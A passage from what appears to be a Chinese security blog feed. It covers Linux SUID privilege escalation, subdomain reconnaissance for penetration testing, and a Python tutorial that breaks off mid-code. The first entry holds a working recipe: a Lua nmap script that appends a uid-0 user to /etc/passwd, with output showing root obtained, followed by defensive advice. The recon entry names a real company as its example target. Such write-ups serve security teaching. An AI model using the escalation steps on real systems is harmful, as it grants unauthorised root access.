UID不相同，而且没有使用-p参数，则bash会将Effective UID还原成Real UID。据说Ubuntu16.04之后都做了相关防护，在dash代码中添加了以下函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">setprivileged</span><span class="hljs-params">(<span class="hljs-type">int</span> on)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> is_privileged = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (is_privileged == on)<br>        <span class="hljs-keyword">return</span>;<br><br>    is_privileged = on;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * To limit bogus system(3) or popen(3) calls in setuid binaries, require</span><br><span class="hljs-comment">     * -p flag to work in this situation.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (!on &amp;&amp; (uid != geteuid() || gid != getegid())) &#123;<br>        setuid(uid);<br>        setgid(gid);<br>        <span class="hljs-comment">/* PS1 might need to be changed accordingly. */</span><br>        choose_ps1();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>目前各大发行版的sh都增加了这个限制，一旦拥有suid的程序存在命令注入漏洞或其本身存在执行命令的功能，那么就有本地提权的风险，如果在sh中增加这个限制，提权的隐患就能被极大地遏制。</p><h3 id="使用nmap脚本创建新用户测试（成功）"><a href="#使用nmap脚本创建新用户测试（成功）" class="headerlink" title="使用nmap脚本创建新用户测试（成功）"></a>使用nmap脚本创建新用户测试（成功）</h3><p>因为nmap script中使用的是lua语言，而lua库中似乎没有直接启动进程的方式，都会依赖系统shell，所以我们可能并不能直接通过执行shell的方式来提权。但是因为此时nmap已经是root权限，我们可以通过修改<code>/etc/passwd</code>的方式来添加一个新的super user</p><p>使用openssl将命令生成加密密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@iZf8zdt0lxjb33kqwiaft8Z:~<span class="hljs-comment"># openssl passwd -1 -salt root2 pass123</span><br>$1$root2<span class="hljs-variable">$q24xYX7T6HxzG7tEjVEKO</span>.<br></code></pre></td></tr></table></figure><p>nmap脚本：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> file = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>file:<span class="hljs-built_in">write</span>(<span class="hljs-string">&quot;root2:$1$root2$q24xYX7T6HxzG7tEjVEKO.:0:0::/root:/bin/bash\n&quot;</span>)<br>file:<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure><p>成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@iZf8zdt0lxjb33kqwiaft8Z:~$ nmap --script=file.nse<br><br>Starting Nmap 7.60 ( https://nmap.org ) at 2022-11-20 18:29 CST<br>WARNING: Running Nmap setuid, as you are doing, is a major security risk.<br><br>NSE: failed to initialize the script engine:<br>/usr/bin/../share/nmap/nse_main.lua:626: file.nse is missing required field: <span class="hljs-string">&#x27;action&#x27;</span><br>stack traceback:<br>        [C]: <span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        /usr/bin/../share/nmap/nse_main.lua:626: <span class="hljs-keyword">in</span> field <span class="hljs-string">&#x27;new&#x27;</span><br>        /usr/bin/../share/nmap/nse_main.lua:825: <span class="hljs-keyword">in</span> <span class="hljs-built_in">local</span> <span class="hljs-string">&#x27;get_chosen_scripts&#x27;</span><br>        /usr/bin/../share/nmap/nse_main.lua:1312: <span class="hljs-keyword">in</span> main chunk<br>        [C]: <span class="hljs-keyword">in</span> ?<br><br>QUITTING!<br>x@iZf8zdt0lxjb33kqwiaft8Z:~$ su root2<br>Password:<br>root@iZf8zdt0lxjb33kqwiaft8Z:/home/x<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><p>管理员要仔细研究具有SUID权限的文件，不要给易被利用的文件（比如上述的一些命令等）以SUID权限，防止SUID的滥用导致攻击者在进入服务器时轻易获取root权限。及时更新新版系统补丁。</p><p>Linux 2.2以后增加了capabilities的概念，可以理解为水平权限的分离。以往如果需要某个程序的某个功能需要特权，我们就只能使用root来执行或者给其增加SUID权限，一旦这样，我们等于赋予了这个程序所有的特权，这是不满足权限最小化的要求的；在引入capabilities后，root的权限被分隔成很多子权限，这就避免了滥用特权的问题，我们可以在<a href="http://man7.org/linux/man-pages/man7/capabilities.7.html">capabilities(7) - Linux manual page</a>中看到这些特权的说明。</p><p>比如我们可以给nmap添加类似的能力即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">setcap</span> cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap<br>nmap --privileged -sS 192.168.1.1<br></code></pre></td></tr></table></figure><p>这样就可以不使用SUID权限即可拥有相关的能力。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>顶级域名、子域名收集</title>
    <link href="/blog/2022/11/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86-%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4/"/>
    <url>/blog/2022/11/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86-%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4/</url>
    
    <content type="html"><![CDATA[<p><strong>近日针对项目甲方的网站资产使用项目研发的逻辑漏洞扫描器进行扫描，需要收集一下甲方的网站子域名列表用于测试，因此记录一下收集的过程。域名是很重要的资产，一个目标暴露在互联网的资产大多以域名的方式访问</strong></p><p><img src="/images/fj40.jpg"></p><span id="more"></span><h2 id="顶级域名收集"><a href="#顶级域名收集" class="headerlink" title="顶级域名收集"></a>顶级域名收集</h2><h3 id="查找目标顶级域名"><a href="#查找目标顶级域名" class="headerlink" title="查找目标顶级域名"></a>查找目标顶级域名</h3><p>如果你不知道目标公司的主域名，可以利用搜索引擎去检索，找到该公司的官网，例如百度的官网就是<a href="https://www.baidu.com,那么我们就知道对应的其中一个顶级域名为baidu.com./">https://www.baidu.com，那么我们就知道对应的其中一个顶级域名为baidu.com。</a></p><h3 id="查找目标关联顶级域名"><a href="#查找目标关联顶级域名" class="headerlink" title="查找目标关联顶级域名"></a>查找目标关联顶级域名</h3><p>由于一个目标企业可能会有多个顶级域名，例如百度的顶级域名不止 baidu.com, 还有 hao123.com 等，只有尽可能找到所有关联域名，才能把资产收集得更全面。</p><h4 id="备案查询"><a href="#备案查询" class="headerlink" title="备案查询"></a>备案查询</h4><p><a href="https://beian.miit.gov.cn/">工信部 ICP&#x2F;IP地址&#x2F;域名信息备案管理系统</a></p><p>首先在ICP备案查询中可以查询我们上一步找到的顶级域名，就可以找到主办单位名称：</p><p><img src="/images/image-20221107195340508.png" alt="image-20221107195340508"></p><p>主办单位名称为：中国太平洋保险（集团）股份有限公司</p><p>接下来搜索主办单位名称：</p><p><img src="/images/image-20221107195433971.png" alt="image-20221107195433971"></p><p>便可以得到该企业的备案的顶级域名。</p><h4 id="企业关系查询"><a href="#企业关系查询" class="headerlink" title="企业关系查询"></a>企业关系查询</h4><p>目标企业可能会有很多子公司，特别是全资子公司，子公司的名称和母公司的名称不一样，注册的域名也不一样，子公司有时是一个很好的突破口。可以在天眼查、爱企查、企查查等平台进行关系查询。</p><p><a href="https://www.tianyancha.com/">天眼查</a></p><p><a href="https://aiqicha.baidu.com/">爱企查</a></p><p><a href="https://www.qcc.com/">企查查</a></p><p>可以通过查看股权穿透图来找子公司，然后查看子公司的域名，不断重复，直到获取所有子公司的域名</p><p><img src="/images/image-20221107200505540.png" alt="image-20221107200505540"></p><h4 id="whois-反查关联域名"><a href="#whois-反查关联域名" class="headerlink" title="whois 反查关联域名"></a>whois 反查关联域名</h4><p>可以通过 whois 的信息进行反查域名，如同一公司的域名可能通过同一个邮箱进行注册</p><p><a href="http://whois.chinaz.com/">域名Whois查询 - 站长之家</a></p><p><img src="/images/image-20221107201913326.png" alt="image-20221107201913326"></p><p>whois反查结果：</p><p><img src="/images/image-20221107202020298.png" alt="image-20221107202020298"></p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p>获取目标公司所有关联域名之后，我们可以开始收集它们的子域名。</p><h3 id="利用证书透明度收集子域名"><a href="#利用证书透明度收集子域名" class="headerlink" title="利用证书透明度收集子域名"></a>利用证书透明度收集子域名</h3><p>证书透明度是一个开放体系，专门记录、审核并监控在互联网公开受信任的 TLS 证书。由于很多企业的域名都用了 https 协议，TLS证书里面一般包含域名信息，公司组织名称等，子域名中的证书信息一般情况也是一样的，可以通过证书透明度查询所有子域名。</p><p>常用查询网站：</p><ul><li><a href="https://crt.sh/">crt.sh | Certificate Search</a></li><li><a href="https://search.censys.io/">Censys Search</a></li><li><a href="https://sslmate.com/ct_search_api/">Certificate Transparency Search API by SSLMate</a></li></ul><p><img src="/images/image-20221107203945246.png" alt="image-20221107203945246"></p><h3 id="使用搜索引擎"><a href="#使用搜索引擎" class="headerlink" title="使用搜索引擎"></a>使用搜索引擎</h3><p>我们也可以利用搜索引擎的检索能力去收集子域名。</p><p>比如谷歌上用语法 site:cpic.com.cn</p><p><img src="/images/image-20221107204351659.png" alt="image-20221107204351659"></p><h3 id="使用开源的自动化工具"><a href="#使用开源的自动化工具" class="headerlink" title="使用开源的自动化工具"></a>使用开源的自动化工具</h3><h4 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h4><p><a href="https://github.com/shmilylty/OneForAll">OneForAll</a>是一款功能强大的子域收集工具，使用python编写。</p><p>收集能力：</p><ul><li>利用证书透明度收集子域（目前有6个模块：<code>censys_api</code>，<code>certspotter</code>，<code>crtsh</code>，<code>entrust</code>，<code>google</code>，<code>spyse_api</code>）</li><li>常规检查收集子域（目前有4个模块：域传送漏洞利用<code>axfr</code>，检查跨域策略文件<code>cdx</code>，检查HTTPS证书<code>cert</code>，检查内容安全策略<code>csp</code>，检查robots文件<code>robots</code>，检查sitemap文件<code>sitemap</code>，利用NSEC记录遍历DNS域<code>dnssec</code>，后续会添加NSEC3记录等模块）</li><li>利用网上爬虫档案收集子域（目前有2个模块：<code>archivecrawl</code>，<code>commoncrawl</code>）</li><li>利用DNS数据集收集子域（目前有24个模块：<code>bevigil_api</code>, <code>binaryedge_api</code>, <code>bufferover</code>, <code>cebaidu</code>, <code>chinaz</code>, <code>chinaz_api</code>, <code>circl_api</code>, <code>cloudflare</code>, <code>dnsdb_api</code>, <code>dnsdumpster</code>, <code>hackertarget</code>, <code>ip138</code>, <code>ipv4info_api</code>, <code>netcraft</code>, <code>passivedns_api</code>, <code>ptrarchive</code>, <code>qianxun</code>, <code>rapiddns</code>, <code>riddler</code>, <code>robtex</code>, <code>securitytrails_api</code>, <code>sitedossier</code>, <code>threatcrowd</code>, <code>wzpc</code>, <code>ximcx</code>）</li><li>利用DNS查询收集子域（目前有5个模块：通过枚举常见的SRV记录并做查询来收集子域<code>srv</code>，以及通过查询域名的DNS记录中的MX,NS,SOA,TXT记录来收集子域）</li><li>利用威胁情报平台数据收集子域（目前有6个模块：<code>alienvault</code>, <code>riskiq_api</code>，<code>threatbook_api</code>，<code>threatminer</code>，<code>virustotal</code>，<code>virustotal_api</code>）</li><li>利用搜索引擎发现子域（目前有18个模块：<code>ask</code>, <code>baidu</code>, <code>bing</code>, <code>bing_api</code>, <code>duckduckgo</code>, <code>exalead</code>, <code>fofa_api</code>, <code>gitee</code>, <code>github</code>, <code>github_api</code>, <code>google</code>, <code>google_api</code>, <code>shodan_api</code>, <code>so</code>, <code>sogou</code>, <code>yahoo</code>, <code>yandex</code>, <code>zoomeye_api</code>），在搜索模块中除特殊搜索引擎，通用的搜索引擎都支持自动排除搜索，全量搜索，递归搜索。</li><li>字典和自定义fuzz爆破，爆破时使用<a href="https://github.com/blechschmidt/massdns">massdns</a></li></ul><h4 id="subfinder"><a href="#subfinder" class="headerlink" title="subfinder"></a>subfinder</h4><p><a href="https://github.com/projectdiscovery/subfinder">subfinder</a>是一种子域发现工具，它通过使用被动在线资源发现网站的有效子域。它具有简单的模块化架构，并针对速度进行了优化。Subfinder 仅用于做一件事 - 被动子域枚举，它做得很好。需要Go语言环境运行。</p><h3 id="泛解析问题"><a href="#泛解析问题" class="headerlink" title="泛解析问题"></a>泛解析问题</h3><p>泛域名解析是一种特殊的域名解析方式。它使用通配符形式，设置域名解析。它可以将没有明确设置的子域名一律解析到一个IP地址上。这样，即使用户输入错误的子域名，也可以访问到域名持有者指定的IP地址。但是信息收集中，这会造成请求的所有子域名都能访问的假象，从而收集到一堆无效的子域名。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">ping</span> wwwwwwww.taobao.com<br><br>正在 <span class="hljs-built_in">Ping</span> dualstack-na61-na62.wagbridge.alibaba.taobao.com.gds.alibabadns.com [<span class="hljs-number">203</span>.<span class="hljs-number">119</span>.<span class="hljs-number">144</span>.<span class="hljs-number">26</span>] 具有 <span class="hljs-number">32</span> 字节的数据:<br>来自 <span class="hljs-number">203</span>.<span class="hljs-number">119</span>.<span class="hljs-number">144</span>.<span class="hljs-number">26</span> 的回复: 字节=<span class="hljs-number">32</span> 时间=<span class="hljs-number">29</span>ms TTL=<span class="hljs-number">84</span><br>来自 <span class="hljs-number">203</span>.<span class="hljs-number">119</span>.<span class="hljs-number">144</span>.<span class="hljs-number">26</span> 的回复: 字节=<span class="hljs-number">32</span> 时间=<span class="hljs-number">29</span>ms TTL=<span class="hljs-number">84</span><br>来自 <span class="hljs-number">203</span>.<span class="hljs-number">119</span>.<span class="hljs-number">144</span>.<span class="hljs-number">26</span> 的回复: 字节=<span class="hljs-number">32</span> 时间=<span class="hljs-number">64</span>ms TTL=<span class="hljs-number">84</span><br>来自 <span class="hljs-number">203</span>.<span class="hljs-number">119</span>.<span class="hljs-number">144</span>.<span class="hljs-number">26</span> 的回复: 字节=<span class="hljs-number">32</span> 时间=<span class="hljs-number">35</span>ms TTL=<span class="hljs-number">84</span><br><br><span class="hljs-number">203</span>.<span class="hljs-number">119</span>.<span class="hljs-number">144</span>.<span class="hljs-number">26</span> 的 <span class="hljs-built_in">Ping</span> 统计信息:<br>    数据包: 已发送 = <span class="hljs-number">4</span>，已接收 = <span class="hljs-number">4</span>，丢失 = <span class="hljs-number">0</span> (<span class="hljs-number">0</span>% 丢失)，<br>往返行程的估计时间(以毫秒为单位):<br>    最短 = <span class="hljs-number">29</span>ms，最长 = <span class="hljs-number">64</span>ms，平均 = <span class="hljs-number">39</span>ms<br><br><span class="hljs-built_in">ping</span> wwwwwwww.baidu.com<br><span class="hljs-built_in">Ping</span> 请求找不到主机 wwwwwwww.baidu.com。请检查该名称，然后重试。<br></code></pre></td></tr></table></figure><p>可以判断百度未使用泛解析，而淘宝域名使用了泛解析</p><p>目前子域名爆破最常见的解决泛解析问题是使用IP黑名单的方式，首先解析一个不可能存在的域名，如果可以解析证明存在泛解析，然后不断随机产生随机的域名，收集返回的IP地址和TTL，直到大部分IP地址出现两次以上，该列表即为泛解析黑名单，后面子域名爆破时根据黑名单进行过滤。</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python的迭代器、生成器、装饰器</title>
    <link href="/blog/2022/11/05/Python%E7%9A%84%E8%BF%AD%E4%BB%A3%E5%99%A8%E3%80%81%E7%94%9F%E6%88%90%E5%99%A8%E3%80%81%E8%A3%85%E9%A5%B0%E5%99%A8/"/>
    <url>/blog/2022/11/05/Python%E7%9A%84%E8%BF%AD%E4%BB%A3%E5%99%A8%E3%80%81%E7%94%9F%E6%88%90%E5%99%A8%E3%80%81%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>Python三大器可能在平常写代码时会不知不觉的用到，但是却从未系统的学习过，于是乎特意记录一篇，尤其是装饰器，Flask中很常用，但是不是很了解具体的工作原理，有必要了解一下</strong></p><p><img src="/images/fj39.jpg"></p><span id="more"></span><h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><p>迭代是重复反馈过程的活动，其目的通常是为了逼近所需目标或结果。每一次对过程的重复称为一次“迭代”，而每一次迭代得到的结果会作为下一次迭代的初始值。</p><h3 id="可迭代对象-iterable"><a href="#可迭代对象-iterable" class="headerlink" title="可迭代对象(iterable)"></a>可迭代对象(iterable)</h3><p>该对象可以被用于for…in…循环，例如：集合，列表，元祖，字典，字符串，迭代器等。</p><p>在python中如果一个对象实现了 __iter__方法，我们就称之为可迭代对象，可迭代对象必须提供一个__next__() 方法，执行该方法要么返回迭代中的下一项，要么就引起一个StopIteration异常，以终止迭代（只能往前，不能退后）</p><p>如果一个对象未实现 __iter__方法，但是对其使用for…in则会抛出TypeError: ‘xxx’ object is not iterable</p><p>可以在一个对象内部实现一个__iter__方法将一个类实例对象变为可迭代对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections.abc <span class="hljs-keyword">import</span> Iterable<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyIterable</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__iter__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">isinstance</span>(MyIterable(), Iterable)) <span class="hljs-comment"># True</span><br></code></pre></td></tr></table></figure><h3 id="迭代器-1"><a href="#迭代器-1" class="headerlink" title="迭代器"></a>迭代器</h3><p>对可迭代对象进行迭代的方式或容器，并且会记录当前迭代进行到的位置。在python中如果一个对象同时实现了__iter__和__next__(获取下一个值)方法，那么它就是一个迭代器对象。可以通过内置函数next(iterator)或实例对象的__next__()方法，来获取当前迭代的值。</p><p>使用while模拟for循环：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">list1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br>l = list1.__iter__()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(l.__next__()) <span class="hljs-comment"># 也可以是 print(next(l))</span><br>    <span class="hljs-keyword">except</span> StopIteration:<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><p>迭代器对象表示的是一个数据流，可以在需要时才去调用next来获取一个值；因而本身在内存中始终只保留一个值，对于内存占用小可以存放无限数据流。优于其他容器需要一次将所有元素都存放进内存，如：列表、集合、字典…等</p><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>缺点也很明显，除了遍历完计数之外，没有办法获取存放的元素的长度，并且不能像列表、字典等可以取任意位置的元素值，而且迭代器是一次性的，元素迭代结束生命周期就相应结束。</p><h2 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h2><p>在Python中，一边循环，一边计算的机制，称为生成器。</p><h3 id="生成器的作用"><a href="#生成器的作用" class="headerlink" title="生成器的作用"></a>生成器的作用</h3><p>对象中的元素是按照某种算法<strong>推算</strong>出来的，在<strong>循环的过程中不断推算出后续的元素</strong>，这样就<strong>不必创建完整的list</strong>，从而<strong>节省大量的空间。</strong>在Python中，这种一边循环一边计算的机制，称为生成器：generator。</p><h3 id="生成器的生成"><a href="#生成器的生成" class="headerlink" title="生成器的生成"></a>生成器的生成</h3><h4 id="简单生成器"><a href="#简单生成器" class="headerlink" title="简单生成器"></a>简单生成器</h4><p>通过将列表生成时的[]改变为()即可得到一个生成器对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 生成器</span><br>_generator = (i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(_generator))  <span class="hljs-comment"># &lt;class &#x27;generator&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(_generator)  <span class="hljs-comment"># &lt;generator object &lt;genexpr&gt; at 0x0000027A2E797F48&gt;</span><br><span class="hljs-comment"># 生成器对象取值</span><br><span class="hljs-built_in">print</span>(_generator.__next__())  <span class="hljs-comment"># 0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(_generator)) <span class="hljs-comment"># 1</span><br><span class="hljs-comment"># 注意从第三个元素开始了！</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------------------------&quot;</span>)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> _generator:<br><span class="hljs-built_in">print</span>(x)  <span class="hljs-comment"># 2, 3, 4, 5, 6, 7, 8, 9</span><br></code></pre></td></tr></table></figure><h4 id="函数对象生成器"><a href="#函数对象生成器" class="headerlink" title="函数对象生成器"></a>函数对象生成器</h4><p>带yield语句的函数对象的返回值则是个生成器对象：</p><ol><li>当我们想从生成器取一个数时，生成器会执行，直至出现 yield 语句，生成器把yield 的参数给我们，之后生成器就不会往下继续运行。</li><li>当我们问它取下一个数时，他会从上次的状态开始运行，直至出现yield语句，把参数给我们，之后停下。如此反复</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_generator</span>():<br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">2</span><br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">3</span><br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(gen_generator(), <span class="hljs-built_in">type</span>(gen_generator()))  <br><span class="hljs-comment"># &lt;generator object gen_generator at 0x000001CD94BA7F48&gt; &lt;class &#x27;generator&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(func(), <span class="hljs-built_in">type</span>(func()))  <br><span class="hljs-comment"># 1 &lt;class &#x27;int&#x27;&gt;</span><br>g = gen_generator()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(g)) <span class="hljs-comment"># 1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-----------&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> g:<br>    <span class="hljs-built_in">print</span>(i) <span class="hljs-comment"># 2, 3, 4</span><br></code></pre></td></tr></table></figure><h2 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h2><h3 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h3><p>装饰器是给已经定义好的函数添加功能的工具。装饰器就是一个函数，这个函数既是实参高阶函数，又是返回值高阶函数。</p><h4 id="对象引用"><a href="#对象引用" class="headerlink" title="对象引用"></a>对象引用</h4><p>对象名是一个绑定内存地址的变量，举个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>():   <span class="hljs-comment"># 函数名仅仅只是个绑定内存地址的变量       </span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;i`m running&quot;</span>) <br>                     <br><span class="hljs-comment"># 这是调用                       </span><br>func()  <span class="hljs-comment"># i`m running</span><br><span class="hljs-comment"># 这是对象引用，引用的是内存地址        </span><br>func2 = func  <br><span class="hljs-built_in">print</span>(func2 <span class="hljs-keyword">is</span> func)  <span class="hljs-comment"># True</span><br><span class="hljs-comment"># 通过引用进行调用  </span><br>func2()  <span class="hljs-comment"># i`m running</span><br></code></pre></td></tr></table></figure><h4 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h4><p>定义一个函数A，然后在该函数内部再定义一个函数B，并且B函数用到了外边A函数的变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">out_func_A</span>():<br>out_a = <span class="hljs-number">10</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inner_func_B</span>(<span class="hljs-params">inner_x</span>):<br><span class="hljs-keyword">return</span> out_a + inner_x<br><br><span class="hljs-keyword">return</span> inner_func_B<br><br><br>out = out_func_A()<br><span class="hljs-built_in">print</span>(out)  <span class="hljs-comment"># &lt;function out_func_A.&lt;locals&gt;.inner_func_B at 0x000001CD05EFC168&gt; out_func返回的是inner_func的内存地址</span><br><span class="hljs-built_in">print</span>(out(inner_x=<span class="hljs-number">2</span>))  <span class="hljs-comment"># 12</span><br></code></pre></td></tr></table></figure><p>装饰器和闭包不同点在于：装饰器的入参是<strong>函数对象</strong>，闭包入参是<strong>普通数据对象</strong></p><h3 id="一个实例"><a href="#一个实例" class="headerlink" title="一个实例"></a>一个实例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span 